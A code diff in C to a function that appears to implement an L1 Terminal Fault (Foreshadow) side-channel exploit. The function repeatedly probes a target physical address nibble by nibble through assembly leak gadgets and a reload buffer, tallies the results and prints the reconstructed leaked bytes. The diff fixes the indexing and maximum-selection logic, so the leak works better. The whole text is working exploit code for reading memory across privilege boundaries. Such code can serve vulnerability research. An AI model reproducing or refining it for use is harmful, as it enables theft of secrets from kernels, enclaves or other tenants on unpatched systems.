@@ -304,7 +304,7 @@ void l1tf_do_leak(const uintptr_t phys_addr, const size_t length) {
   fprintf(stderr, "Clear the reload buffer at %p\n", (void *)reload_buffer);
   memset(reload_buffer, 0, sizeof(reload_buffer_t));
 
-  const size_t results_size = (2 * length) * 16 * sizeof(size_t);
+  const size_t results_size = sizeof(size_t[2 * length][16]);
   size_t(*results)[16] = malloc(results_size);
   memset(results, 0, results_size);
 
@@ -317,35 +317,34 @@ void l1tf_do_leak(const uintptr_t phys_addr, const size_t length) {
   assert(start + length < 0xfff);
 
   for (int iter = 1; iter <= 10000; ++iter) {
-    // while (true) {
-    for (size_t i = 0, j = start; j < start + length; j += 1) {
-      void *leak_addr = (char *)leak.leak + j;
-      size_t high = l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_high_nibble) & 0xf;
-      size_t low = l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_low_nibble) & 0xf;
+    for (int x = 0; x < 10; ++x) {
+      for (size_t i = 0, j = start; j < start + length; j += 1, i += 2) {
+        void *leak_addr = (char *)leak.leak + j;
+        size_t high =
+            l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_high_nibble) & 0xf;
+        size_t low = l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_low_nibble) & 0xf;
 
-      // Count the number of times each result has occured
-      results[i++][high]++;
-      results[i++][low]++;
+        // Count the number of times each result has occured
+        results[i][high]++;
+        results[i + 1][low]++;
+      }
     }
 
-    //printf("Leaked from %p (%d):\t", (void *)phys_addr, iter);
     for (size_t i = 0; i < 2 * length; i += 2) {
-      size_t high = 0, low = 0;
-
-      size_t max_high = maximum(15, &results[i][1]);
-      if (results[i][max_high] > 1) {
-        high = results[i][max_high];
+      size_t high = maximum(15, &results[i][1]) + 1;
+      if (results[i][high] < 2) {
+        high = 0;
       }
-      size_t max_low = maximum(15, &results[i + 1][1]);
-      if (results[i + 1][max_low] > 1) {
-        low = results[i + 1][max_low];
+
+      size_t low = maximum(15, &results[i + 1][1]) + 1;
+      if (results[i + 1][low] < 2) {
+        low = 0;
       }
 
       size_t result = ((high & 0x0f) << 4) | (low & 0x0f);
-      printf("%02x ", results);
+      printf("%02lx ", result);
     }
     printf("\r");
-    // }
   }
 
   free(results);
